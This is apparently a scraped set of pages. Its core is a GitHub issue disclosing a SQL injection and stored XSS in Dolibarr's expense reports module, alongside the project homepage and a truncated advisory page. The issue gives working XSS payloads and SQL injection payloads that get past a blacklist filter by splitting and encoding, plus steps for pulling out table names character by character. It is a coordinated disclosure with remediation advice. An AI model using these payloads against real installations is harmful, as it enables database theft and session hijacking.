=== Content from github.com_21f7f4c4_20250124_164258.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fissues%2F9449)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fissues%2F9449)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=Dolibarr%2Fdolibarr)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Dolibarr](/Dolibarr)
/
**[dolibarr](/Dolibarr/dolibarr)**
Public

* [Notifications](/login?return_to=%2FDolibarr%2Fdolibarr) You must be signed in to change notification settings
* [Fork
  2.8k](/login?return_to=%2FDolibarr%2Fdolibarr)
* [Star
   5.6k](/login?return_to=%2FDolibarr%2Fdolibarr)

* [Code](/Dolibarr/dolibarr)
* [Issues
  952](/Dolibarr/dolibarr/issues)
* [Pull requests
  221](/Dolibarr/dolibarr/pulls)
* [Actions](/Dolibarr/dolibarr/actions)
* [Projects
  2](/Dolibarr/dolibarr/projects)
* [Security](/Dolibarr/dolibarr/security)
* [Insights](/Dolibarr/dolibarr/pulse)

Additional navigation options

* [Code](/Dolibarr/dolibarr)
* [Issues](/Dolibarr/dolibarr/issues)
* [Pull requests](/Dolibarr/dolibarr/pulls)
* [Actions](/Dolibarr/dolibarr/actions)
* [Projects](/Dolibarr/dolibarr/projects)
* [Security](/Dolibarr/dolibarr/security)
* [Insights](/Dolibarr/dolibarr/pulse)

# [Versions < 7.X] Disclosure of [CVE-2018-16809] SQL injection + [CVE-2018-16808] multiple XSS in expense reports Â #9449

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[[Versions < 7.X] Disclosure of [CVE-2018-16809] SQL injection + [CVE-2018-16808] multiple XSS in expense reports](#top) #9449Copy link[![@ACKNAK-Tools](https://avatars.githubusercontent.com/u/23616980?u=c1f9b0481c6232f3980d807c79fe1a3e284bd59d&v=4&size=80)](/ACKNAK-Tools)
## Description

[![@ACKNAK-Tools](https://avatars.githubusercontent.com/u/23616980?u=c1f9b0481c6232f3980d807c79fe1a3e284bd59d&v=4&size=48)](/ACKNAK-Tools)[ACKNAK-Tools](https://github.com/ACKNAK-Tools)opened [on Sep 9, 2018](https://github.com/Dolibarr/dolibarr/issues/9449#issue-358387896)

Just a ticket issue that is already solved as we discussed by email earlier. Since the vulnerabilities are fixed so we are disclosing the advisory..

As a reminder here are our mail discussion:

"""

Hello,

First, we apologize for the time we took to contact you back

(<https://www.dolibarr.fr/forum/12-howto--aide/61141-vulnerabilites-critiques-versions-3-8-x-7-x#94096>).

We have found 2 criticals vulnerabilities (SQL Injection + XSS Stored)

in the "expense reports" module of Dolibarr (from version 3.8.X to the

last release 7.X).

These vulnerabilities are described in the two .txt disclosures files

attached.

Please let us know if you have difficulties to reproduce the

vulnerabilities (you should use Burp as a proxy to edit easily the POST

requests). We can provide you screenshots so you'll be more aware of

what is happening.

Also we'd like to be informed when you'll have implement a fix for these

vulnerabilities (as the ones advised in the disclosures), so we can test

if the vulnerabilities are patched.

Once a proper fix will be released, we'd like to request 2 CVEs (SQLi

and XSS Stored) and we would appreciate if you can name us in two

separates disclosures/patchs.

Best regards,

--

chqrly, Erwan, Romain

DIGITEMIS CYBERSECURITY & PRIVACY

"""

Here is the first advisory about 2 two differents XSS stored in expense reports (one in the description of a new expense, the other one in the private && public note related to:

[[CVE-2018-16808](https://github.com/advisories/GHSA-r3r5-fqfm-9wrh "CVE-2018-16808")]

1. ADVISORY INFORMATION

   =======================

   Product: Dolibarr

   Vendor URL: <https://www.dolibarr.org>

   Type: XSS Stored

   Date found: 2018-02-20
2. CREDITS

   ==========

   This vulnerability was discovered and researched by Romain Koszyk, Erwan Robin, chqrly from DIGITEMIS CYBERSECURITY & PRIVACY.
3. VERSIONS AFFECTED

   ====================

   Dolibarr v3.8.X (starting from the new "expense reports" module) to last versions (v7.0.X)
4. INTRODUCTION

   ===============

   Dolibarr is an Open Source ERP & CRM for Business. The application manages sales, human resources, stocks, invoicing, billing, accounting, etc.

   The Open Source model gives them a lot of feedback which is a key factor to get a friendly user interface.
5. VULNERABILITY DETAILS

   ========================

   Dolibarr v3.8.X (starting from the new "expense reports" module) to last versions (v7.0.X)

   offers the possibility to process billing if you decide to activate the module.

   The expense reports module is a critical module since it might be used by a lot. No modules are activated by default.

   When you are editing a billing at "/expensereport/card.php?id=$id\_integer&action=editline&rowid=$rowid\_integer", the POST parameters

   not sanitizing properly the parameters. In fact, the application is using a recursive call to an eregi() or a preg\_match() regex to determine

   the legitimity of the query being processed. The strings parameters "comments" and the public & private note can be abused to store a XSS.

   A XSS can also be triggered in the integers parameters however that will fail due to the integers parsing,

   generating an error which leak technical details about the database. The leak is due to a default misconfiguration of the server gives us too the information details about the query failing,

   PHP's version, Dolibarr's version, Server, type of database, OS' version.

The impact of the XSS Stored is more critical since there are no protection of the users by default (cookies' attributes, CSRF token, etc.).

Two contexts where XSS were found, in the description billing line and in the private & public note (when you want to edit them while the payload is set):

PAYLOAD\_DESCRIPTION=

2"><object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoJ1hTUycpPg==><td class="a

PAYLOAD\_PRIVATE\_AND\_PUBLIC\_NOTE=

</textarea><object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoJ1hTUycpPg==><textarea>

Payload explanation:

We escape from the current td or textarea entity to inject an object entity. We also need to create another td or textarea element since there is a or </textarea> to be associated with.

The base64 "PHN2Zy9vbmxvYWQ9YWxlcnQoJ1hTUycpPg==" stands for <svg/onload=alert('XSS')>

There are some filters used to block XSS like onload, onerror, etc. So using base64 still do the job, it is an example of many.

6. RISK

   ========

   If exploited, that vulnerability can allow to steal an user session, even the super admin one is the super admin is designed as a validator of that billing.

   It can also used to make the users do unwilling actions on the application, exfiltrate private data to an unknown destination, etc.
7. SOLUTION

   ===========

   Sanitized properly the query before processing the request.

   Don't rely on blacklist to protect the application.

It is recommended to use htmlentities($parameter, ENT\_QUOTE | ENT\_HTML5, "UTF-8", true);

8. REPORT TIMELINE

   ==================

   2018-02-20: Discovery of the vulnerability

   2018-02-20: Explanation of the vulnerability

   2018-02-21: Determine all of the versions vulnerable to the exploit

   2018-03-09: Send full vulnerability details to the Dolibarr's developers

   2018-09-09: Disclosing the vulnerability on Github

   2018-09-11: [CVE-2018-16808](https://github.com/advisories/GHSA-r3r5-fqfm-9wrh "CVE-2018-16808") assigned

And the advisory of the SQL injection in expense report:

[[CVE-2018-16809](https://github.com/advisories/GHSA-h34q-878w-w96r "CVE-2018-16809")]

1. ADVISORY INFORMATION

   =======================

   Product: Dolibarr

   Vendor URL: <https://www.dolibarr.org>

   Type: UPDATE SQL Injection through Integer

   Date found: 2018-02-20
2. CREDITS

   ==========

   This vulnerability was discovered and researched by Romain Koszyk, Erwan Robin, chqrly from DIGITEMIS CYBERSECURITY & PRIVACY.
3. VERSIONS AFFECTED

   ====================

   Dolibarr v3.8.X (starting from the new "expense reports" module) to last versions (v7.X)
4. INTRODUCTION

   ===============

   Dolibarr is an Open Source ERP & CRM for Business. The application manages sales, human resources, stocks, invoicing, billing, accounting, etc.

   The Open Source model gives them a lot of feedback which is a key factor to get a friendly user interface.
5. VULNERABILITY DETAILS

   ========================

   Dolibarr v3.8.X (starting from the new "expense reports" module) to last versions (v7.X)

   offers the possibility to process billing if you decide to activate the module.

   The expense reports module is a critical module since it might be used by a lot. No modules are activated by default.

   When you are editing a billing at "/expensereport/card.php?id=$id\_integer&action=editline&rowid=$rowid\_integer", the POST parameters

   not sanitizing properly the parameters.In fact, the application is using a recursive call to preg\_match regex to determine

   the legitimity of the query being processed. The integers parameters "qty", "value\_unit" can be abused efficiently.

A default misconfiguration of the server (by default) gives us too the information details about the query failing,

PHP's version, Dolibarr's version, Server, type of database, OS' version.

That way we can exploit the SQL injection easier.

To protect against SQL injections / XSS, Dolibarr uses these functions in /htdocs/main.inc.php :

=> function test\_sql\_and\_script\_inject($val, $type)

=> function analyseVarsForSqlAndScriptsInjection(&$var, $type)

Having these function in /htdocs/main.inc.php suggests that these are supposed to protect the whole application against SQLi/XSS.

They are based on a blacklist (using preg\_match) to detect a malicious code.

So please have a real look at the fix you implement since this vulnerability is spreading probably accross many modules.

Context of the current query exploited:

We are in the modification of a billing.

The UPDATE query is constructed that way:

UPDATE llx\_expensereport\_det SET

comments=$comment,value\_unit=$value\_unit,

qty=$quantity,date=$date,total\_ht=$total\_ht,

total\_ttc=$total\_ttc,tva\_tx=$tva\_tx,

fk\_c\_type\_fees=$type\_fees,fk\_projet=$fk\_projet

WHERE rowid=$rowid;

Indications about the query:

* $date is composed of the parameters data\_day, date\_month, date\_year and date as DD/MM/YYYY. Those date's parameters are reformated to 'YYYYMMDD000000' of install time
* $total\_ht, $total\_ttc, $type\_fees are server values calculated
* $comment, $date, $fk\_projet are strings values and seems to be properly escaped
* $qty, $value\_unit, $tva\_tx are doubles.

Vulnerability was found abusing doubles parameters. There is a high possibility of injections in others types of parameters since using these functions to protect to protect the application is not enough.

Depending of the Dolibarr's version, we can either bypass the preg\_match using an HTTP Parameters Fragmentation with at least 2 vulnerables parameters or with only one parameter by encoding some characters.

A working payload for an SQL Injection inside the modification of a billing line below version 7.X could be:

HTTP Parameters Fragmentation method with PAYLOAD\_ONE and PAYLOAD\_TWO

#####################################################################

UPDATE llx\_expensereport\_det SET comments=$comment,value\_unit=PAYLOAD\_ONE,qty=PAYLOAD\_TWO,date=$date,total\_ht=$total\_ht,total\_ttc=$total\_ttc,tva\_tx=$tva\_tx,fk\_c\_type\_fees=$type\_fees,fk\_projet=$fk\_projet WHERE rowid=$rowid;

PAYLOAD\_ONE=

(SEleCT(ascii(substring((Select(table\_name)/\*

PAYLOAD\_TWO=

*/fRom(information\_schema.tables)whEre((table\_schema!='mysql')anD(table\_schema!='information\_schema'))/*!LIMIT\*/0,1),1,1)))),qty=666

Payload explanation:

To avoid being caught by the insensitive case select.+from preg\_match() regex, we split the payload into 2 parameters, those 2 parameters are doubles so spaces are removed from it. To keep having a working payload we have to abuse the use of (), /\*\*/ and /*!command*/.

Putting together the two payloads, we have a final UPDATE query like:

UPDATE llx\_expensereport\_det SET comments=$comment,value\_unit=(SEleCT(ascii(substring((Select(table\_name)/*,qty=*/fRom(information\_schema.tables)whEre((table\_schema!='mysql')anD(table\_schema!='information\_schema'))/*!LIMIT*/0,1),1,1)))),qty=666,date=$date,total\_ht=$total\_ht,total\_ttc=$total\_ttc,tva\_tx=$tva\_tx,fk\_c\_type\_fees=$type\_fees,fk\_projet=$fk\_projet WHERE rowid=$rowid;

As you can see the commented out $qty parameter is added at the end of the payload to let the UPDATE query still looks legitimate.

Basically what is doing the current payload is retrieving the 1st char of the 1st table\_name in the database and getting the ascii value of it. We can iterate to grab the 2nd char, the next table, column and so on.

So if the 1st char of the 1st table is 'l' (like llx\_something), we will see in the value\_unit billing line the value 108 which is the ascii code of 'l'.

That kind of payload is also working in the last stable version 7.0.

However we also noticed a more efficient method in the last one.

It is possible in version 7.0 we can bypass the preg\_match filter by encoding some characters allowing us to only use one parameter.

Only one parameter method

#########################

UPDATE llx\_expensereport\_det SET comments=$comment,value\_unit=$value\_unit,qty=PAYLOAD,date=$date,total\_ht=$total\_ht,total\_ttc=$total\_ttc,tva\_tx=$tva\_tx,fk\_c\_type\_fees=$type\_fees,fk\_projet=$fk\_projet WHERE rowid=$rowid;

We also optimized the characters search, with that payload we can retrieve 5 characters per request:

PAYLOAD=

(SEleCT(ascii(substring((Select(table\_name)fR%6fm(information\_schema.tables)whEre((table\_schema!='mysql')anD(table\_schema!='information\_schema'))/*!LIMIT*/0,1),1,1))%2aPOW(256,0)%2bascii(substring((Select(table\_name)fR%6fm(information\_schema.tables)whEre((table\_schema!='mysql')anD(table\_schema!='information\_schema'))/*!LIMIT*/0,1),2,1))%2aPOW(256,1)%2bascii(substring((Select(table\_name)fR%6fm(information\_schema.tables)whEre((table\_schema!='mysql')anD(table\_schema!='information\_schema'))/*!LIMIT*/0,1),3,1))%2aPOW(256,2)%2bascii(substring((Select(table\_name)fR%6fm(information\_schema.tables)whEre((table\_schema!='mysql')anD(table\_schema!='information\_schema'))/*!LIMIT*/0,1),4,1))%2aPOW(256,3)%2bascii(substring((Select(table\_name)fR%6fm(information\_schema.tables)whEre((table\_schema!='mysql')anD(table\_schema!='information\_schema'))/*!LIMIT*/0,1),5,1))%2aPOW(256,4)))

The bypass is made on fRom by encoding the 'o' as its hexadecimal equivalent '6f'.

The payload is injected in the $qty parameter, it will holds the value of the ascii(1st\_char) \* 256^0 + ascii(2nd\_char) \* 256^1 + ascii(3rd\_char) \* 256^2 + ascii(4th\_char) \* 256^3 + ascii(5th\_char) \* 256^4

So using this payload we see that we retrieved the value 418213555308 in quantity.

To get the chars of it, we just use a binary mask:

(418213555308 >> 0) & 0b11111111 => 108 ('l')

(418213555308 >> 8) & 0b11111111 => 108 ('l')

(418213555308 >> 16) & 0b11111111 => 120 ('x')

(418213555308 >> 24) & 0b11111111 => 95 ('\_')

(418213555308 >> 32) & 0b11111111 => 108 ('a')

So the first table\_name has a name starting with 'llx\_a'.

6. RISK

   ========

   If exploited, that vulnerability can allow to retrieve hash password, update billing that have already been accepted, retrieve files contents, retrieve the content of the whole database (tables, columns).
7. SOLUTION

   ===========

   Sanitized properly the query before processing the request, don't rely on preg\_match protection, use prepared statements in the best of case or use this implementation:

$db\_link = mysqli\_connect("localhost", "user", "password", "db");

if (!$db\_link) {

printf("Connection to the database failed: %s\n", mysqli\_connect\_error());

exit();

}

$sanitized\_parameter = mysqli\_real\_escape($db\_link, $string\_to\_escape);

// That way we don't need to rely on blacklist preg\_match

mysqli\_query($db\_link, "UPDATE .......... qty='$sanitized\_parameter'...");

8. REPORT TIMELINE

   ==================

   2018-02-20: Discovery of the vulnerability

   2018-02-20: Explanation of the vulnerability

   2018-02-21: Development of the exploit code

   2018-02-21: Determine all of the versions vulnerable to the exploit code

   2018-03-09: Send full vulnerability details to the Dolibarr's developers

   2018-09-09: Disclosing the vulnerability on Github

   2018-09-11: [CVE-2018-16809](https://github.com/advisories/GHSA-h34q-878w-w96r "CVE-2018-16809") assigned

DIGITEMIS CYBERSECURITY & PRIVACY

<https://www.digitemis.com>

This ticket will be updated once the CVE will be asigned, thanks and keep up the good work !

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from www.dolibarr.org_64355e31_20250126_022031.html ===


[![Open Source ERP and CRM | Web business suite Dolibarr](/medias/image/www.dolibarr.org/images/dolibarr_logo_white.svg)](/)

* [Features](/#features)
* [Blog](/#lastnews)
* [Community](/#community)
* [Documentation](/documentation-home.php)
* [Online demo](/onlinedemo.php)
* [Downloads](/downloads.php)
* [Addons](/addon-market-place.php)
* [Forum](/forum.php)

| [Download Last stable    20.0.3](/downloads.php) |
| --- |

Dolibarr ERP and CRM
# Open Source ERP & CRM for business

(SMEs, Large Companies, Freelancers, Foundations)

![](/medias/image/www.dolibarr.org/images/imageweb3.webp)

[Download](/downloads.php)
[Test online](/onlinedemo.php)

## One **web suite** to manage all of your **business**...

## An all-in-one suite

![Dolibarr, easy to use ERP and CRM software for businesses](/medias/image/www.dolibarr.org/images/dolibarr_box.webp)

â¢ **Enable only the features that you want**: Whatever your needs are (Customer Relationship Management, Sales, Human Resources, Logistics, Stock, Invoicing, Accounting, Manufacturing, Marketing, Foundation Management, Surveys, ...), you can setup the application to match your needs... [See Features](#features)
â¢ **No more double entries**: Integration between the features/modules is ready and "in-the-box". Users are immediately able to work with the software, even without customisation.
â¢ **Upgrade at any time**: The upgrades of new versions are integrated by design into the development process. So, you can upgrade Dolibarr at any time to the latest version, irrespective of which Dolibarr version you are using, and without losing any data. Thus, users always benefit from the latest features and innovations.
â¢ **A customisable and extensible application**: The **marketplace** is open to everybody and serves as a central repository for hundreds of external add-ons which enhance Dolibarr for specific needs.
You can also extend and enhance the features of your application by yourself, without any coding or development effort, by using the **low-code** Module Builder assistant. If the Module Builder does not offer all the customisation that you need, then you can take the route of custom development to achieve your business goals.

## A FOSS (Free Open Source Software) model

â¢ **A more competitive solution**: Due to our **Free Open Source Software** model, several thousands of developers, testers, translators, and end users work on the Dolibarr project.That's why Dolibarr is always at the forefront of innovation.
â¢ **The easiest ERP and CRM** system in the market: The Open Source model allows developers and users to enhance the user interface due to the constant feedback and contributions of the Dolibarr user community.
Everybody can contribute to enhance the Dolibarr application. This is an important factor that defines why Dolibarr became so user-friendly. [See Community section](#community)

## A multi-distribution model - On-premise or in the Cloud

â¢ **Install the Dolibarr application where ever you want**: You can install and use Dolibarr **as a local application** or **online** on a dedicated/virtual machine. You can thus use Dolibarr **from anywhere and on any device**.
â¢ **Available on all platforms**, **on-premise** or as a **SaaS application**: Dolibarr is available in various forms: From **auto-installer packages** that install Dolibarr and all prerequisites with no need of any technical knowledge, or from the **standard distribution** working on all Operating System platforms and PHP architectures (Windows, Mac, Linux).
Dolibarr is also available as a **SaaS application**. [See Cloud offers](https://saas.dolibarr.org)

â¢ **A rich ecosystem of partners**: Because Dolibarr is Open Source software, you can rely on any Open Source company to assist you or to engage in custom development if you need it.

## Features

### CRM & Sales

 [...](an-easy-to-use-crm-in-the-cloud-or-on-premise.php)

[Prospects / Customers](/presentation-prospect-and-customers.php)
[Opportunities](/presentation-opportunities.php)
[Proposals](/presentation-quotes-proposals.php)
[Sale Orders](/presentation-orders.php)
[Contracts / Subscriptions](/presentation-contracts-subscriptions.php)
[Help Desk / Tickets](/presentation-tickets.php)

### Human Reationship Management (HR)

[Employees](/presentation-users-employees.php)
[Expense Reports](/presentation-expense-reports.php)
[Leave Requests](/presentation-leave-requests.php)
[Timesheets](/presentation-timesheets.php)
[Recruitment](/presentation-recruitments.php)
[Membership](/presentation-membership-management.php)

### CMS, Website, POS

[CMS / Website](/presentation-cms-website.php)

[Point Of Sale](/presentation-point-of-sale-pos.php)

### Product & Stock

[Products, Services](/presentation-products-services.php)
[Stocks](/presentation-stock-management.php)
[Purchase, Approvisionning](/presentation-purchase-approvisionning.php)
[Shipments](/presentation-shipments.php)
[Manufacturing](/presentation-production-mrp.php)

### Finance & Billing

[Billing & Payments](/presentation-billing-invoicing.php)
[Bank reconciliation](/presentation-bank-reconciliation.php)
[Double entry accounting](/presentation-double-entry-accounting.php)

### Marketing

[Emailing](/presentation-emailing.php)
[Surveys](/presentation-surveys-polls.php)

### Productivity

[Projects, Tasks](/presentation-projects-tasks.php)
[Interventions](/presentation-interventions.php)
[Agenda](/presentation-agenda.php)

### Integration, Development

[API](/presentation-api.php)
[Connectivity with external tools](/presentation-connectivity.php)
[Import, Export](/presentation-imports-exports.php)
[Module Builder for developers](/presentation-development-ide.php)

### Download more plugins/addons from...

[![DoliStore, official market place for Dolibarr ERP CRM](/medias/image/www.dolibarr.org/images/dolistore_logo.svg)](https://www.dolistore.com "DoliStore, official market place for Dolibarr ERP CRM")

### Or find a partner for custom development...

[![Dolibarr partner companies](/medias/image/www.dolibarr.org/images/dolibarr_preferred_partner.png)](https://partners.dolibarr.org "Dolibarr partner companies")

## Latest news...

January 19, 2025

![](/medias/image/www.dolibarr.org/images/stories/fosdem-logo.400.webp)
### [Would you like to help run the Dolibarr stand at FOSDEM 2025 in Brussels (February 1â2)?](dolibarr-need-you-at-the-fosdem-2025-in-bruxelles-1_2-february.php)

Details
Written by anonymous

Dolibarr need you at the FOSDEM 2025 in Bruxelles (1 - 2 february)

 [Read more...](dolibarr-need-you-at-the-fosdem-2025-in-bruxelles-1_2-february.php)

January 13, 2025

![](/medias/image/www.dolibarr.org/images/stories/dolistore-logo.png)
### [Re-Opening of DoliStore](re-opening-of-dolistore.php)

Details
Written by anonymous

Re-Opening of DoliStore

 [Read more...](re-opening-of-dolistore.php)

January 06, 2025

![](/medias/image/www.dolibarr.org/images/stories/retrospective_2024_en.webp)
### [2024 retrospective Dolibarr](2024-retrospective-dolibarr.php)

Details
Written by anonymous

2024 retrospective Dolibarr

 [Read more...](2024-retrospective-dolibarr.php)

January 06, 2025

![](/medias/image/www.dolibarr.org/images/stories/fosdem-logo.400.webp)
### [Dolibarr at the FOSDEM 2025 in Bruxelles (1 - 2 february)](dolibarr-at-the-fosdem-2025-in-bruxelles-1_2-february.php)

Details
Written by anonymous

Dolibarr at the FOSDEM 2025 in Bruxelles (1 - 2 february)

 [Read more...](dolibarr-at-the-fosdem-2025-in-bruxelles-1_2-february.php)

* <<
* <
* [1](/index.php?start=0#lastnews "1")
* [2](/index.php?start=4#lastnews "2")
* [3](/index.php?start=8#lastnews "3")
* [4](/index.php?start=12#lastnews "4")
* ...
* [>](/index.php?start=4#lastnews "Next")
* [>>](/index.php?start=272#lastnews "End")

## Community

Used by **millions of users** worldwide, Dolibarr ERP CRM became a major integrated solution in the Open Source world.
Its user and developer community is growing day and day.

![The Dolibarr ecosystem](/medias/image/www.dolibarr.org/images/video-thumbnail.webp)

### The foundation

The Dolibarr foundation was created in 2009 to promote Dolibarr ERP CRM software. This portal is hosted and maintained by the foundation. You can find more information about the Dolibarr association [on this page](/the-dolibarr-foundation.php "Dolibarr foundation - association").
Some countries has their own portal for their country/language.

* ![Es](/medias/image/www.dolibarr.org/images/stories/flags/es.gif)
* ![De](/medias/image/www.dolibarr.org/images/stories/flags/de.gif) [www.dolibarr.de](https://www.dolibarr.de "Dolibarr Deutschland")
* ![It](/medias/image/www.dolibarr.org/images/stories/flags/it.gif) [www.dolibarr.it](https://www.dolibarr.it "Dolibarr Italy")
* ![Gr](/medias/image/www.dolibarr.org/images/stories/flags/gr.gif) [www.dolibarr.gr](https://www.dolibarr.gr "Dolibarr Greece")

Help us by [Joining the foundation...](https://asso.dolibarr.org/index.php/Subscribe)

### Documentation

Take a look at this page to find [resources about documentation](/documentation-home.php "resources documentation").

### Forum

Some public forums are available to exchange about any topics related to installation, upgrade, or use of Dolibarr ERP CRM. Create your account and [ask or answers questions on official forums](/forum.php "forum").

### A large team

Dolibarr development is handled by a very large and international community of thousand of volunteers (developers, translators, testers, designers) but
also a [network of partners](https://partners.dolibarr.org) in all the world.

### Developer tools

The Development is managed by the Dolibarr Core team. You can read [the wiki site](https://wiki.dolibarr.org/index.php/Dolibarr_Project "Dolibarr project organization") to get more information about who do what.

* [Developer documentation](/developer-documentation.php)
* [Sources (code)](/git-sources.php)
* [Sources (documentation)](https://doxygen.dolibarr.org "Doxygen documentation sources (generated documentation)")
* [News and social networks](/mailing-lists.php)
* [Bugs manager](/bugs-manager.php)
* [Tasks manager and Roadmap](/tasks-manager.php)
* [Screenshots of features](/#features)
* [Resources (logos, videos, courses,...)](/resources.php "Resources, logos, videos, templates, marketing slides...")

Dolibarr ERP CRM Â© 2003-2025 - Open Source Software for business (Windows - MAC - Linux - Cloud)

English

Arab
Catalan
Danish
Dutch
Finish
French
Georgian
German
Greek
Italian
Japanese
Macedonian
Portuguese
Polish
Romanian
Russian
Swedish
Swahili
Turkish
Ukrainian
Chinese (simplified)
Chinese (traditional)

[Legal and Privacy](/legal-privacy-gdpr.php)



=== Content from github.com_ee990eb2_20250126_022028.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-h34q-878w-w96r)

**CVE-2018-16809**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

